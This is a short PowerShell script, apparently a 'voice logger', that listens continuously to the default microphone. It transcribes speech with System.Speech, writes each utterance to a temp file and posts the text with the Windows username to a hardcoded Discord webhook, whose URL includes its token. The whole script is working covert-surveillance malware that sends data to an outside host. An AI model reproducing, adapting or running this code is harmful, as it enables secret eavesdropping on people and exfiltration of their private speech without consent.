function DC-Upload {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$text 
    )

    $dc = https://discord.com/api/webhooks/1214869769946275843/cvJANOrIVKj1beFvMTkKZ54xNAkiLekpMLaJhB4rIS_BLHR-_70CX3n2JMF3VBTDZUxU

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
    }
}

function voiceLogger {

    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $log = "$env:temp/VoiceLog.txt"
            echo $results > $log
            $text = Get-Content $log -Raw
            DC-Upload $text

            # Use a switch statement with the $results variable
            switch -regex ($results) {
                '\bnote\b' {Start-Process notepad}
                '\bexit\b' {break}
            }
        }
    }
    Clear-Content -Path $log
}

voiceLogger
